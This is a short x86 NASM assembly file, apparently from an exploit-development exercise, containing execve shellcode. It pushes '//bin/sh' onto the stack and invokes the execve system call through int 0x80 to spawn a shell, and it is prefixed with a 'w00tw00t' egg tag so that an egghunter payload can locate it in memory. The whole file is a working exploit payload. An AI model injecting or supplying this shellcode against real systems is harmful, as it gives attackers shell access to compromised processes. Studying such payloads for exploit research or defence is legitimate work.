; Filename: execve.nasm
; Author:  Swaroop Yermalkar
 
global _start	
;tag word so our egghunter can find the shellcode		

db "w00tw00t"  ;declaring our keyword

section .text
_start:
	
	xor eax, eax
	push eax

	; Pushing //bin/sh

	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80